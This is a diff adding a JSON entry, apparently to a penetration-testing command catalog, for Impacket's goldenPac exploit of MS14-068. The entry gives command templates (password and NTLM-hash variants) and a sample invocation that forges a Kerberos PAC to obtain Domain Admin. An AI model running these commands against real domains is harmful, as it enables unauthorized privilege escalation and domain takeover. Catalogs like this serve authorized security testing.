@@ -1,0 +1,31 @@
+{
+  "id": "impacket-goldenPac",
+  "name": "Impacket goldenPac (MS14-068)",
+  "command": "impacket-goldenPac '<domain>/<user>:<password>@<dc_fqdn>'",
+  "description": "Exploit MS14-068 Kerberos privilege escalation to obtain Domain Admin via forged PAC",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "kerberos"
+  ],
+  "tags": [
+    "impacket",
+    "ms14-068",
+    "goldenpac",
+    "privilege-escalation",
+    "kerberos",
+    "pac"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-goldenPac -hashes ':<hash>' '<domain>/<user>@<dc_fqdn>'"
+    }
+  ],
+  "examples": [
+    "impacket-goldenPac 'CORP.LOCAL/user:password@dc01.corp.local'"
+  ]
+}
